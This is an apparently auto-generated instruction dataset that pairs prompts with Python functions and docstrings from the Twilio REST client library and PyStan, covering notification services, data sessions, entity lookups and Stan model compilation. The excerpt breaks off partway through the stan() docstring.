{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, friendly_name=values.unset, log_queries=values.unset,\n               unique_name=values.unset, callback_url=values.unset,\n               callback_events=values.unset, fallback_actions=values.unset,\n               initiation_actions=values.unset, style_sheet=values.unset):\n        \"\"\"\n        Update the AssistantInstance\n\n        :param unicode friendly_name: A text description for the Assistant. It is non-unique and can up to 255 characters long.\n        :param bool log_queries: A boolean that specifies whether queries should be logged for 30 days further training. If false, no queries will be stored, if true, queries will be stored for 30 days and deleted thereafter. Defaults to true if no value is provided.\n        :param unicode unique_name: A user-provided string that uniquely identifies this resource as an alternative to the sid. Unique up to 64 characters long.\n        :param unicode callback_url: A user-provided URL to send event callbacks to.\n        :param unicode callback_events: Space-separated list of callback events that will trigger callbacks.\n        :param dict fallback_actions: The JSON actions to be executed when the user's input is not recognized as matching any Task.\n        :param dict initiation_actions: The JSON actions to be executed on inbound phone calls when the Assistant has to say something first.\n        :param dict style_sheet: The JSON object that holds the style sheet for the assistant\n\n        :returns: Updated AssistantInstance\n        :rtype: twilio.rest.preview.understand.assistant.AssistantInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            log_queries=log_queries,\n            unique_name=unique_name,\n            callback_url=callback_url,\n            callback_events=callback_events,\n            fallback_actions=fallback_actions,\n            initiation_actions=initiation_actions,\n            style_sheet=style_sheet,\n        )", "response": "Updates the AssistantInstance with the specified parameters."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of AllTimeInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AllTimeInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeInstance\n        \"\"\"\n        return AllTimeInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new NotificationInstance", "response": "def create(self, body=values.unset, priority=values.unset, ttl=values.unset,\n               title=values.unset, sound=values.unset, action=values.unset,\n               data=values.unset, apn=values.unset, gcm=values.unset,\n               sms=values.unset, facebook_messenger=values.unset, fcm=values.unset,\n               segment=values.unset, alexa=values.unset, to_binding=values.unset,\n               identity=values.unset, tag=values.unset):\n        \"\"\"\n        Create a new NotificationInstance\n\n        :param unicode body: The notification body text\n        :param NotificationInstance.Priority priority: The priority of the notification\n        :param unicode ttl: How long, in seconds, the notification is valid\n        :param unicode title: The notification title\n        :param unicode sound: The name of the sound to be played for the notification\n        :param unicode action: The actions to display for the notification\n        :param dict data: The custom key-value pairs of the notification's payload\n        :param dict apn: The APNS-specific payload that overrides corresponding attributes in a generic payload for APNS Bindings\n        :param dict gcm: The GCM-specific payload that overrides corresponding attributes in generic payload for GCM Bindings\n        :param dict sms: The SMS-specific payload that overrides corresponding attributes in generic payload for SMS Bindings\n        :param dict facebook_messenger: Deprecated\n        :param dict fcm: The FCM-specific payload that overrides corresponding attributes in generic payload for FCM Bindings\n        :param unicode segment: A Segment to notify\n        :param dict alexa: Deprecated\n        :param unicode to_binding: The destination address specified as a JSON string\n        :param unicode identity: The `identity` value that identifies the new resource's User\n        :param unicode tag: A tag that selects the Bindings to notify\n\n        :returns: Newly created NotificationInstance\n        :rtype: twilio.rest.notify.v1.service.notification.NotificationInstance\n        \"\"\"\n        data = values.of({\n            'Identity': serialize.map(identity, lambda e: e),\n            'Tag': serialize.map(tag, lambda e: e),\n            'Body': body,\n            'Priority': priority,\n            'Ttl': ttl,\n            'Title': title,\n            'Sound': sound,\n            'Action': action,\n            'Data': serialize.object(data),\n            'Apn': serialize.object(apn),\n            'Gcm': serialize.object(gcm),\n            'Sms': serialize.object(sms),\n            'FacebookMessenger': serialize.object(facebook_messenger),\n            'Fcm': serialize.object(fcm),\n            'Segment': serialize.map(segment, lambda e: e),\n            'Alexa': serialize.object(alexa),\n            'ToBinding': serialize.map(to_binding, lambda e: e),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return NotificationInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return NotificationInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of NotificationInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstream the DataSessionInstance records from the API as a generator.", "response": "def stream(self, end=values.unset, start=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams DataSessionInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param datetime end: The end\n        :param datetime start: The start\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.wireless.v1.sim.data_session.DataSessionInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(end=end, start=start, page_size=limits['page_size'], )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstreaming the DataSessionInstance records from the API as a list.", "response": "def list(self, end=values.unset, start=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists DataSessionInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime end: The end\n        :param datetime start: The start\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.wireless.v1.sim.data_session.DataSessionInstance]\n        \"\"\"\n        return list(self.stream(end=end, start=start, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef page(self, end=values.unset, start=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of DataSessionInstance records from the API.\n        Request is executed immediately\n\n        :param datetime end: The end\n        :param datetime start: The start\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of DataSessionInstance\n        :rtype: twilio.rest.wireless.v1.sim.data_session.DataSessionPage\n        \"\"\"\n        params = values.of({\n            'End': serialize.iso8601_datetime(end),\n            'Start': serialize.iso8601_datetime(start),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return DataSessionPage(self._version, response, self._solution)", "response": "Retrieve a single page of DataSessionInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return DataSessionInstance(self._version, payload, sim_sid=self._solution['sim_sid'], )", "response": "Build an instance of DataSessionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return AddOnResultContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            reference_sid=self._solution['reference_sid'],\n            sid=sid,\n        )", "response": "Constructs a AddOnResultContext\n\n        :param sid: The unique string that identifies the resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultContext\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of AddOnResultInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AddOnResultInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultInstance\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultInstance\n        \"\"\"\n        return AddOnResultInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            reference_sid=self._solution['reference_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfetch a AddOnResultInstance :returns: Fetched AddOnResultInstance :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a AddOnResultInstance\n\n        :returns: Fetched AddOnResultInstance\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AddOnResultInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            reference_sid=self._solution['reference_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the payloads :returns: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadList :rtype: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadList", "response": "def payloads(self):\n        \"\"\"\n        Access the payloads\n\n        :returns: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadList\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.payload.PayloadList\n        \"\"\"\n        if self._payloads is None:\n            self._payloads = PayloadList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                reference_sid=self._solution['reference_sid'],\n                add_on_result_sid=self._solution['sid'],\n            )\n        return self._payloads"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: AddOnResultContext for this AddOnResultInstance\n        :rtype: twilio.rest.api.v2010.account.recording.add_on_result.AddOnResultContext\n        \"\"\"\n        if self._context is None:\n            self._context = AddOnResultContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                reference_sid=self._solution['reference_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new ServiceInstanceVersionInstance", "response": "def create(self, friendly_name=values.unset, apn_credential_sid=values.unset,\n               gcm_credential_sid=values.unset, messaging_service_sid=values.unset,\n               facebook_messenger_page_id=values.unset,\n               default_apn_notification_protocol_version=values.unset,\n               default_gcm_notification_protocol_version=values.unset,\n               fcm_credential_sid=values.unset,\n               default_fcm_notification_protocol_version=values.unset,\n               log_enabled=values.unset, alexa_skill_id=values.unset,\n               default_alexa_notification_protocol_version=values.unset):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode apn_credential_sid: The SID of the Credential to use for APN Bindings\n        :param unicode gcm_credential_sid: The SID of the Credential to use for GCM Bindings\n        :param unicode messaging_service_sid: The SID of the Messaging Service to use for SMS Bindings\n        :param unicode facebook_messenger_page_id: Deprecated\n        :param unicode default_apn_notification_protocol_version: The protocol version to use for sending APNS notifications\n        :param unicode default_gcm_notification_protocol_version: The protocol version to use for sending GCM notifications\n        :param unicode fcm_credential_sid: The SID of the Credential to use for FCM Bindings\n        :param unicode default_fcm_notification_protocol_version: The protocol version to use for sending FCM notifications\n        :param bool log_enabled: Whether to log notifications\n        :param unicode alexa_skill_id: Deprecated\n        :param unicode default_alexa_notification_protocol_version: Deprecated\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.notify.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'ApnCredentialSid': apn_credential_sid,\n            'GcmCredentialSid': gcm_credential_sid,\n            'MessagingServiceSid': messaging_service_sid,\n            'FacebookMessengerPageId': facebook_messenger_page_id,\n            'DefaultApnNotificationProtocolVersion': default_apn_notification_protocol_version,\n            'DefaultGcmNotificationProtocolVersion': default_gcm_notification_protocol_version,\n            'FcmCredentialSid': fcm_credential_sid,\n            'DefaultFcmNotificationProtocolVersion': default_fcm_notification_protocol_version,\n            'LogEnabled': log_enabled,\n            'AlexaSkillId': alexa_skill_id,\n            'DefaultAlexaNotificationProtocolVersion': default_alexa_notification_protocol_version,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef notifications(self):\n        if self._notifications is None:\n            self._notifications = NotificationList(self._version, service_sid=self._solution['sid'], )\n        return self._notifications", "response": "Access the notifications\n\n        :returns: twilio.rest.notify.v1.service.notification.NotificationList\n        :rtype: twilio.rest.notify.v1.service.notification.NotificationList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nupdates the ServiceInstance s properties", "response": "def update(self, friendly_name=values.unset, apn_credential_sid=values.unset,\n               gcm_credential_sid=values.unset, messaging_service_sid=values.unset,\n               facebook_messenger_page_id=values.unset,\n               default_apn_notification_protocol_version=values.unset,\n               default_gcm_notification_protocol_version=values.unset,\n               fcm_credential_sid=values.unset,\n               default_fcm_notification_protocol_version=values.unset,\n               log_enabled=values.unset, alexa_skill_id=values.unset,\n               default_alexa_notification_protocol_version=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode apn_credential_sid: The SID of the Credential to use for APN Bindings\n        :param unicode gcm_credential_sid: The SID of the Credential to use for GCM Bindings\n        :param unicode messaging_service_sid: The SID of the Messaging Service to use for SMS Bindings\n        :param unicode facebook_messenger_page_id: Deprecated\n        :param unicode default_apn_notification_protocol_version: The protocol version to use for sending APNS notifications\n        :param unicode default_gcm_notification_protocol_version: The protocol version to use for sending GCM notifications\n        :param unicode fcm_credential_sid: The SID of the Credential to use for FCM Bindings\n        :param unicode default_fcm_notification_protocol_version: The protocol version to use for sending FCM notifications\n        :param bool log_enabled: Whether to log notifications\n        :param unicode alexa_skill_id: Deprecated\n        :param unicode default_alexa_notification_protocol_version: Deprecated\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.notify.v1.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            apn_credential_sid=apn_credential_sid,\n            gcm_credential_sid=gcm_credential_sid,\n            messaging_service_sid=messaging_service_sid,\n            facebook_messenger_page_id=facebook_messenger_page_id,\n            default_apn_notification_protocol_version=default_apn_notification_protocol_version,\n            default_gcm_notification_protocol_version=default_gcm_notification_protocol_version,\n            fcm_credential_sid=fcm_credential_sid,\n            default_fcm_notification_protocol_version=default_fcm_notification_protocol_version,\n            log_enabled=log_enabled,\n            alexa_skill_id=alexa_skill_id,\n            default_alexa_notification_protocol_version=default_alexa_notification_protocol_version,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef exports(self):\n        if self._exports is None:\n            self._exports = ExportList(self)\n        return self._exports", "response": "Access the ExportList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef export_configuration(self):\n        if self._export_configuration is None:\n            self._export_configuration = ExportConfigurationList(self)\n        return self._export_configuration", "response": "Access the ExportConfigurationList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return MonthlyInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of MonthlyInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconstructing a AvailableAddOnExtensionContext :param sid: The unique Extension Sid :returns: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionContext :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a AvailableAddOnExtensionContext\n\n        :param sid: The unique Extension Sid\n\n        :returns: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionContext\n        :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionContext\n        \"\"\"\n        return AvailableAddOnExtensionContext(\n            self._version,\n            available_add_on_sid=self._solution['available_add_on_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of AvailableAddOnExtensionInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of AvailableAddOnExtensionInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionInstance\n        :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionInstance\n        \"\"\"\n        return AvailableAddOnExtensionInstance(\n            self._version,\n            payload,\n            available_add_on_sid=self._solution['available_add_on_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfetch a AvailableAddOnExtensionInstance :returns: Fetched AvailableAddOnExtensionInstance :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a AvailableAddOnExtensionInstance\n\n        :returns: Fetched AvailableAddOnExtensionInstance\n        :rtype: twilio.rest.preview.marketplace.available_add_on.available_add_on_extension.AvailableAddOnExtensionInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return AvailableAddOnExtensionInstance(\n            self._version,\n            payload,\n            available_add_on_sid=self._solution['available_add_on_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _proxy(self):\n        if self._context is None:\n            self._context = AvailableAddOnExtensionContext(\n                self._version,\n                available_add_on_sid=self._solution['available_add_on_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the available add on extension"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a new EntityInstance", "response": "def create(self, identity):\n        \"\"\"\n        Create a new EntityInstance\n\n        :param unicode identity: Unique identity of the Entity\n\n        :returns: Newly created EntityInstance\n        :rtype: twilio.rest.authy.v1.service.entity.EntityInstance\n        \"\"\"\n        data = values.of({'Identity': identity, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return EntityInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconstruct a EntityContext :param identity: Unique identity of the Entity :returns: twilio.rest.authy.v1.service.entity.EntityContext :rtype: twilio.rest.authy.v1.service.entity.EntityContext", "response": "def get(self, identity):\n        \"\"\"\n        Constructs a EntityContext\n\n        :param identity: Unique identity of the Entity\n\n        :returns: twilio.rest.authy.v1.service.entity.EntityContext\n        :rtype: twilio.rest.authy.v1.service.entity.EntityContext\n        \"\"\"\n        return EntityContext(self._version, service_sid=self._solution['service_sid'], identity=identity, )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of EntityInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of EntityInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.authy.v1.service.entity.EntityInstance\n        :rtype: twilio.rest.authy.v1.service.entity.EntityInstance\n        \"\"\"\n        return EntityInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return EntityInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            identity=self._solution['identity'],\n        )", "response": "Fetch a EntityInstance\n\n        :returns: Fetched EntityInstance\n        :rtype: twilio.rest.authy.v1.service.entity.EntityInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\naccess the factors :returns: twilio.rest.authy.v1.service.entity.factor.FactorList :rtype: twilio.rest.authy.v1.service.entity.factor.FactorList", "response": "def factors(self):\n        \"\"\"\n        Access the factors\n\n        :returns: twilio.rest.authy.v1.service.entity.factor.FactorList\n        :rtype: twilio.rest.authy.v1.service.entity.factor.FactorList\n        \"\"\"\n        if self._factors is None:\n            self._factors = FactorList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                identity=self._solution['identity'],\n            )\n        return self._factors"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = EntityContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                identity=self._solution['identity'],\n            )\n        return self._context", "response": "Generate an instance context for the entity"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef lookup(name, min_similarity_ratio=.75):\n    if lookuptable is None:\n        build()\n    if name not in lookuptable.keys():\n        from difflib import SequenceMatcher\n        from operator import itemgetter\n        print(\"No match for \" + name + \" in the lookup table.\")\n\n        lkt_keys = list(lookuptable.keys())\n        mapfunction = lambda x: SequenceMatcher(a=name, b=x).ratio()\n        similars = list(map(mapfunction, lkt_keys))\n        similars = zip(range(len(similars)), similars)\n        similars = list(filter(lambda x: x[1] >= min_similarity_ratio,\n                               similars))\n        similars = sorted(similars, key=itemgetter(1))\n\n        if (len(similars)):\n            print(\"But the following similar entries were found: \")\n            for i in range(len(similars)):\n                print(lkt_keys[similars[i][0]] + \" ===> with similary \"\n                      \"ratio of \" + str(round(similars[i][1], 3)) + \"\")\n            print(\"Will return results for entry\"\n                  \" \" + lkt_keys[similars[i][0]] + \" \"\n                  \"(which is the most similar entry found).\")\n            return lookup(lkt_keys[similars[i][0]])\n        else:\n            print(\"And no similar entry found. You may try to decrease\"\n                  \"the min_similarity_ratio parameter.\")\n        return\n    entries = stanftable[lookuptable[name]]\n    if not len(entries):\n        return \"Found no equivalent Stan function available for \" + name\n\n    try:\n        import pandas as pd\n    except ImportError:\n        raise ImportError('Package pandas is require to use this '\n                          'function.')\n\n    return pd.DataFrame(entries)", "response": "Returns a new object that contains all the information about a specific function in the lookup table."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ntranslate Stan model specification into C ++ code.", "response": "def stanc(file=None, charset='utf-8', model_code=None, model_name=\"anon_model\",\n          include_paths=None, verbose=False, obfuscate_model_name=True):\n    \"\"\"Translate Stan model specification into C++ code.\n\n    Parameters\n    ----------\n    file : {string, file}, optional\n        If filename, the string passed as an argument is expected to\n        be a filename containing the Stan model specification.\n\n        If file, the object passed must have a 'read' method (file-like\n        object) that is called to fetch the Stan model specification.\n\n    charset : string, 'utf-8' by default\n        If bytes or files are provided, this charset is used to decode.\n\n    model_code : string, optional\n        A string containing the Stan model specification. Alternatively,\n        the model may be provided with the parameter `file`.\n\n    model_name: string, 'anon_model' by default\n        A string naming the model. If none is provided 'anon_model' is\n        the default. However, if `file` is a filename, then the filename\n        will be used to provide a name.\n\n    include_paths: list of strings, optional\n        Paths for #include files defined in Stan code.\n\n    verbose : boolean, False by default\n        Indicates whether intermediate output should be piped to the\n        console. This output may be useful for debugging.\n\n    obfuscate_model_name : boolean, True by default\n        If False the model name in the generated C++ code will not be made\n        unique by the insertion of randomly generated characters.\n        Generally it is recommended that this parameter be left as True.\n\n    Returns\n    -------\n    stanc_ret : dict\n        A dictionary with the following keys: model_name, model_code,\n        cpp_code, and status. Status indicates the success of the translation\n        from Stan code into C++ code (success = 0, error = -1).\n\n    Notes\n    -----\n    C++ reserved words and Stan reserved words may not be used for\n    variable names; see the Stan User's Guide for a complete list.\n    \n    The `#include` method follows a C/C++ syntax `#include foo/my_gp_funs.stan`.\n    The method needs to be at the start of the row, no whitespace is allowed.\n    After the included file no whitespace or comments are allowed.\n    `pystan.experimental`(PyStan 2.18) has a `fix_include`-function to clean the `#include`\n    statements from the `model_code`. \n    Example: \n    `from pystan.experimental import fix_include`\n    `model_code = fix_include(model_code)`\n\n    See also\n    --------\n    StanModel : Class representing a compiled Stan model\n    stan : Fit a model using Stan\n\n    References\n    ----------\n    The Stan Development Team (2013) *Stan Modeling Language User's\n    Guide and Reference Manual*.  <http://mc-stan.org/>.\n\n    Examples\n    --------\n    >>> stanmodelcode = '''\n    ... data {\n    ...   int<lower=0> N;\n    ...   real y[N];\n    ... }\n    ...\n    ... parameters {\n    ...   real mu;\n    ... }\n    ...\n    ... model {\n    ...   mu ~ normal(0, 10);\n    ...   y ~ normal(mu, 1);\n    ... }\n    ... '''\n    >>> r = stanc(model_code=stanmodelcode, model_name = \"normal1\")\n    >>> sorted(r.keys())\n    ['cppcode', 'model_code', 'model_cppname', 'model_name', 'status']\n    >>> r['model_name']\n    'normal1'\n\n    \"\"\"\n    if file and model_code:\n        raise ValueError(\"Specify stan model with `file` or `model_code`, \"\n                         \"not both.\")\n    if file is None and model_code is None:\n        raise ValueError(\"Model file missing and empty model_code.\")\n    if file is not None:\n        if isinstance(file, string_types):\n            try:\n                with io.open(file, 'rt', encoding=charset) as f:\n                    model_code = f.read()\n            except:\n                logger.critical(\"Unable to read file specified by `file`.\")\n                raise\n        else:\n            model_code = file.read()\n\n    # bytes, going into C++ code\n    model_code_bytes = model_code.encode('utf-8')\n\n    if include_paths is None:\n        include_paths = [os.path.abspath('.')]\n    elif isinstance(include_paths, string_types):\n        include_paths = [include_paths]\n    # add trailing /\n    include_paths = [os.path.join(path, \"\") for path in include_paths]\n    include_paths_bytes = [path.encode('utf-8') for path in include_paths]\n\n    # set to False\n    allow_undefined = False\n\n    if obfuscate_model_name:\n        # Make the model name depend on the code.\n        model_name = (\n            model_name + '_' +\n            hashlib.md5(model_code_bytes).hexdigest())\n\n    model_name_bytes = model_name.encode('ascii')\n\n    if not isinstance(file, string_types):\n        # use default 'unknown file name'\n        filename_bytes  = b'unknown file name'\n    else:\n        # use only the filename, used only for debug printing\n        filename_bytes = os.path.split(file)[-1].encode('utf-8')\n\n    result = pystan._api.stanc(model_code_bytes, model_name_bytes,\n                               allow_undefined, filename_bytes, \n                               include_paths_bytes,\n                              )\n    if result['status'] == -1:  # EXCEPTION_RC is -1\n        msg = result['msg']\n        if PY2:\n            # fix problem with unicode in error message in PY2\n            msg = msg.encode('ascii', 'replace')\n        error_msg = \"Failed to parse Stan model '{}'. Error message:\\n{}\".format(model_name, msg)\n        raise ValueError(error_msg)\n    elif result['status'] == 0:  # SUCCESS_RC is 0\n        logger.debug(\"Successfully parsed Stan model '{}'.\".format(model_name))\n    del result['msg']\n    result.update({'model_name': model_name})\n    result.update({'model_code': model_code})\n    result.update({'include_paths' : include_paths})\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef stan(file=None, model_name=\"anon_model\", model_code=None, fit=None,\n         data=None, pars=None, chains=4, iter=2000, warmup=None, thin=1,\n         init=\"random\", seed=None, algorithm=None, control=None, sample_file=None,\n         diagnostic_file=None, verbose=False, boost_lib=None, eigen_lib=None,\n         include_paths=None, n_jobs=-1, **kwargs):\n    \"\"\"Fit a model using Stan.\n\n    The `pystan.stan` function was deprecated in version 2.17 and will be\n    removed in version 3.0. Compiling and using a Stan Program (e.g., for\n    drawing samples) should be done in separate steps.\n\n    Parameters\n    ----------\n\n    file : string {'filename', file-like object}\n        Model code must found via one of the following parameters: `file` or\n        `model_code`.\n\n        If `file` is a filename, the string passed as an argument is expected\n        to be a filename containing the Stan model specification.\n\n        If `file` is a file object, the object passed must have a 'read' method\n        (file-like object) that is called to fetch the Stan model specification.\n\n    charset : string, optional\n        If bytes or files are provided, this charset is used to decode. 'utf-8'\n        by default.\n\n    model_code : string\n        A string containing the Stan model specification. Alternatively,\n        the model may be provided with the parameter `file`.\n\n    model_name: string, optional\n        A string naming the model. If none is provided 'anon_model' is\n        the default. However, if `file` is a filename, then the filename\n        will be used to provide a name. 'anon_model' by default.\n\n    fit : StanFit instance\n        An instance of StanFit derived from a previous fit, None by\n        default. If `fit` is not None, the compiled model associated\n        with a previous fit is reused and recompilation is avoided.\n\n    data : dict\n        A Python dictionary providing the data for the model. Variables\n        for Stan are stored in the dictionary as expected. Variable\n        names are the keys and the values are their associated values.\n        Stan only accepts certain kinds of values; see Notes.\n\n    pars : list of string, optional\n        A list of strings indicating parameters of interest. By default\n        all parameters specified in the model will be stored.\n\n    chains : int, optional\n        Positive integer specifying number of chains. 4 by default.\n\n    iter : int, 2000 by default\n        Positive integer specifying how many iterations for each chain\n        including warmup.\n\n    warmup : int, iter//2 by default\n        Positive integer specifying number of warmup (aka burin) iterations.\n        As `warmup` also specifies the number of iterations used for stepsize\n        adaption, warmup samples should not be used for inference.\n\n    thin : int, optional\n        Positive integer specifying the period for saving samples.\n        Default is 1.\n\n    init : {0, '0', 'random', function returning dict, list of dict}, optional\n        Specifies how initial parameter values are chosen:\n        - 0 or '0' initializes all to be zero on the unconstrained support.\n        - 'random' generates random initial values. An optional parameter\n            `init_r` controls the range of randomly generated initial values\n            for parameters in terms of their unconstrained support;\n        - list of size equal to the number of chains (`chains`), where the\n            list contains a dict with initial parameter values;\n        - function returning a dict with initial parameter values. The\n            function may take an optional argument 